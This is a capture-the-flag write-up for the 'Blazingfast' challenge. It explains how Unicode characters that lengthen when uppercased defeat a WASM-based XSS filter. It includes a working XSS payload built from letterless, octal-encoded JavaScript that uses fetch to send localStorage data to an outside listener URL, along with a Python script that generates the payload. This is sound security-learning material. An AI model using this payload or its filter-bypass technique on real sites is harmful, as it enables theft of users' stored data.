## Blazingfast

In this chall, we are given a blazing fast MoCkInG CaSe converter written by WASM. Take a look at its source code

index file:

```javascript
    let blazingfast = null;

function mock(str) {
	blazingfast.init(str.length);

	if (str.length >= 1000) return 'Too long!';

	for (let c of str.toUpperCase()) {
		if (c.charCodeAt(0) > 128) return 'Nice try.';
		blazingfast.write(c.charCodeAt(0));
	}

	if (blazingfast.mock() == 1) {
		return 'No XSS for you!';
	} else {
		let mocking = '', buf = blazingfast.read();

		while(buf != 0) {
			mocking += String.fromCharCode(buf);
			buf = blazingfast.read();
		}

		return mocking;
	}
}

function demo(str) {
	document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {	
	blazingfast = instance.exports;

	document.getElementById('demo-submit').onclick = () => {
		demo(document.getElementById('demo').value);
	}

	let query = new URLSearchParams(window.location.search).get('demo');

	if (query) {
		document.getElementById('demo').value = query;
		demo(query);
	}
})
```
blazingfast.c file:

```c
int length, ptr = 0;
char buf[1000];

void init(int size) {
	length = size;
	ptr = 0;
}

char read() {
	return buf[ptr++];
}

void write(char c) {
	buf[ptr++] = c;
}

int mock() {
	for (int i = 0; i < length; i ++) {
		if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
			buf[i] += 32;
		}

		if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
			return 1;
		}
	}

	ptr = 0;

	return 0;
}
```

We can see that the `demo` function is called whenever we click on *Mock me* button. And the `demo` function will call `mock` function which was written in javascript. What this function do is get the length of our input before upper our string and it leads to [inconsistencies in length measurement of some Unicode characters](https://stackoverflow.com/questions/49895784/change-to-length-with-touppercase). I will explain it briefly: you have a special character and after uppercase that character, it will turn into 2 or 3 character. If we use a string of many special characters and its string length is greater than our payload, we can bypass the filter and inject XSS to the program.

However, when we input our payload, some of the input character will be convert to uppercase and the payload will not work. For example, `eval()` will work but `EVAL()` will not work. So we must find a way to bypass this. We can bypass this using the method was provided in this [post](https://techiavellian.com/constructing-an-xss-vector-using-no-letters). Please read that post to understand the method.

We can use the above method to create a function, then convert the inject code we want to octal to inject. We can't continue to use the above method because of the limit of the buffer (1000). Please remember that we must put our octal code in `""` and add a slash before every character in octal form to make it work.

The payload will be like this: `<img src=1 onerror='fetch("https://ATTACKER_URL/?" + localStorage.getItem("flag"))'>` with the fetch part written with the above method. Remember to use special character to help our payload bypass the filter. One special character can turn into 2 or 3 characters after uppercase, so the number of special character will be equal to length(payload)/2 and plus 1 to make sure it enough to cover our payload. The formula for the payload is: `special character*(length(payload)/2+1)+payload`.

This is my code to create the payload. The url I use to listen to request is *https://en3lcrt2nuh0hsi.m.pipedream.net*, so I convert it to octal form and encode the url or it will not work. Please remember to change the payload using your url.

```python

payload = '<img src=1 onerror=\'""[(!1+"")[3]+(!0+"")[2]+({}+"")[2]][({}+"")[5]+({}+"")[1]+((""[(!1+"")[3]+(!0+"")[2]+({}+"")[2]])+"")[2]+(!1+"")[3]+(!0+"")[0]+(!0+"")[1]+(!0+"")[2]+({}+"")[5]+(!0+"")[0]+({}+"")[1]+(!0+"")[1]]("\\146\\145\\164\\143\\150\\050\\042\\150\\164\\164\\160\\163\\072\\057\\057\\145\\156\\063\\154\\143\\162\\164\\062\\156\\165\\150\\060\\150\\163\\151\\056\\155\\056\\160\\151\\160\\145\\144\\162\\145\\141\\155\\056\\156\\145\\164\\057\\077\\042\\053\\154\\157\\143\\141\\154\\123\\164\\157\\162\\141\\147\\145\\056\\147\\145\\164\\111\\164\\145\\155\\050\\042\\146\\154\\141\\147\\042\\051\\051")()\'>'
special_char = 'ﬃ'
print(special_char*(len(payload)//2+1)+requests.utils.quote(payload))

```

Then I use the output from the code above to paste it in the admin bot url. The url will be like this:

`https://blazingfast.mc.ax/?demo=<your payload>&submit=Submit`

After a while, I receive the flag

![success](https://live.staticflickr.com/65535/51868510312_cfd760c8b7_z.jpg)


You can solve this chall by another way which is used in this [post](https://19521646.gitbook.io/wu-ctf/dicectf).

I also read this [writeup](https://ctf.zeyu2001.com/2022/dicectf-2022/blazingfast?fbclid=IwAR31D10A-j2KTB54FDedcwtuE0mmcaqorThG3tb_A-9C46vWIl93xMeAGok) to be able to solve this challenge.